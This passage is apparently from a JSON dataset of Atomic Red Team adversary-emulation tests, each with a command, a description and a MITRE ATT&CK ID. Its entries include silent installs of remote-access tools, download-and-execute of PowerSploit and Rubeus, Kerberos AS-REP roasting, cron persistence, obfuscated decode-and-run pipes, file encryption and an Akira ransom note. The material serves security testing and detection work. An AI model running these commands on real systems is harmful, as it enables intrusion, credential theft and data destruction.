        "ID": 863,
        "Command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n",
        "Description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 864,
        "Command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n",
        "Description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 865,
        "Command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\"\nmsiexec /i $installer /qn\n",
        "Description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 866,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\"\n",
        "Description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 867,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe\"\n",
        "Description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 868,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe\" -ArgumentList \"/S /v/qn\"\n",
        "Description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 869,
        "Command": "Start-Process -Wait -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n",
        "Description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 870,
        "Command": "Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'\n",
        "Description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 871,
        "Command": "Start-Process $env:ProgramFiles\\Connect\\Connect.exe\n",
        "Description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 872,
        "Command": "$file = Join-Path $env:USERPROFILE \"Desktop\\rustdesk-1.2.3-1-x86_64.exe\"\nInvoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe\nStart-Process -FilePath $file \"/S\"",
        "Description": "An adversary may attempt to trick the user into downloading RustDesk and use this to maintain access to the machine. \nDownload of RustDesk installer will be at the destination location when successfully executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 873,
        "Command": "Start-Process \"${env:programfiles(x86)}\\Splashtop\\Splashtop Remote\\Client for STP\\strwinclt.exe\"\n",
        "Description": "An adversary may attempt to trick the user into downloading Splashtop for use as a C2 channel.\nUpon successful execution, Splashtop will be executed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 874,
        "Command": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRServer.exe\"",
        "Description": "An adversary may attempt to use Splashtop Streamer to gain unattended remote interactive access. Upon successful execution, Splashtop streamer will be executed.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 875,
        "Command": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"",
        "Description": "An adversary may attempt to trick a user into executing Microsoft Quick Assist Microsoft Store app and connect to the user's machine. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1219",
        "Shell": "powershell"
    },
    {
        "ID": 876,
        "Command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n",
        "Description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1566.001",
        "Shell": "powershell"
    },
    {
        "ID": 877,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"\n",
        "Description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1566.001",
        "Shell": "powershell"
    },
    {
        "ID": 878,
        "Command": "crontab -l > /tmp/notevil\necho \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil\n",
        "Description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.003",
        "Shell": "sh"
    },
    {
        "ID": 879,
        "Command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil\n",
        "Description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.003",
        "Shell": "bash"
    },
    {
        "ID": 880,
        "Command": "echo \"echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log\" > /etc/cron.d/persistevil\n",
        "Description": "This test adds a script to /etc/cron.d folder configured to execute on a schedule.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.003",
        "Shell": "sh"
    },
    {
        "ID": 881,
        "Command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil\n",
        "Description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.003",
        "Shell": "bash"
    },
    {
        "ID": 882,
        "Command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n",
        "Description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.002",
        "Shell": "sh"
    },
    {
        "ID": 883,
        "Command": "cmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asreproast /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"\n",
        "Description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.004",
        "Shell": "powershell"
    },
    {
        "ID": 884,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.004",
        "Shell": "powershell"
    },
    {
        "ID": 885,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
        "Description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.004",
        "Shell": "powershell"
    },
    {
        "ID": 886,
        "Command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
        "Description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 887,
        "Command": ". \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\"\nGet-GPPPassword -Verbose\n",
        "Description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.006",
        "Shell": "powershell"
    },
    {
        "ID": 888,
        "Command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n",
        "Description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "command_prompt"
    },
    {
        "ID": 889,
        "Command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n",
        "Description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "command_prompt"
    },
    {
        "ID": 890,
        "Command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\"\n",
        "Description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 891,
        "Command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'\n",
        "Description": "Use Perl to decode a base64-encoded text string and echo it to the console    \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 892,
        "Command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d\necho $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n",
        "Description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 893,
        "Command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | b64encode -r -)\nprintf $ENCODED | b64decode -r\necho $ENCODED | b64decode -r\necho $(echo $ENCODED) | b64decode -r\necho $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && b64decode -r < /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r\necho $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r\n",
        "Description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 894,
        "Command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh\necho IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh\necho IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh\necho IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh\n",
        "Description": "Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 895,
        "Command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded\necho $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p\necho $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p\n",
        "Description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 896,
        "Command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash\necho IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash\necho IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash\necho IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash\n",
        "Description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "sh"
    },
    {
        "ID": 897,
        "Command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"AAkqKQEM\"; key = \"waEHleblxiQjoxFJQaIMLdHKz\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",
        "Description": "An adversary can obfuscate malicious commands or payloads using XOR and execute them on the victim's machine. This test uses Python to decode and execute commands on the machine.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1140",
        "Shell": "bash"
    },
    {
        "ID": 898,
        "Command": "echo \"passwd\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd\n",
        "Description": "Uses gpg to encrypt a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 899,
        "Command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd\n",
        "Description": "Uses 7z to encrypt a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 900,
        "Command": "which_ccencrypt=`which ccencrypt`\ncp /etc/passwd /tmp/passwd;\n$which_ccencrypt -T -K passwd /tmp/passwd\n",
        "Description": "Attempts to encrypt data on target systems as root to simulate an interruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 901,
        "Command": "which_openssl=`which openssl`\n$which_openssl genrsa -out /tmp/key.pem 2048\n$which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem\n$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip\n",
        "Description": "Uses openssl to encrypt a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 902,
        "Command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n",
        "Description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "command_prompt"
    },
    {
        "ID": 903,
        "Command": "7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt\n",
        "Description": "This test encrypts the file(s) using the 7z utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 904,
        "Command": "openssl enc -pbkdf2 -in ~/test.txt -out ARTFile\n",
        "Description": "This test encrypts the file(s) using the openssl utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "sh"
    },
    {
        "ID": 905,
        "Command": "Set-Content -Path \"$env:temp\\test.txt\" -Value \"populating this file with some text\"  # Create the test.txt file again in case prereqs failed\ncmd /c \"`\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\"$env:temp\\test.txt`\"\"\n",
        "Description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "powershell"
    },
    {
        "ID": 906,
        "Command": "\"\"%PROGRAMFILES%\\dcrypt\"\\dcrypt.exe\"\n",
        "Description": "DiskCryptor, an open source encryption utility, can be exploited by adversaries for encrypting all disk partitions, including system partitions. This tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/. The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor. During the installation process, running dcrypt.exe starts the encryption console. It's important to note that a system reboot is necessary as part of the installation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "command_prompt"
    },
    {
        "ID": 907,
        "Command": "1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(\"c:\\test.$_.akira\", $out) }\necho \"Hi friends\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption  Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help.  \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Then all of this will be published in our blog -\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paste this link - https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. Use this code - - to log into our chat.\" >> 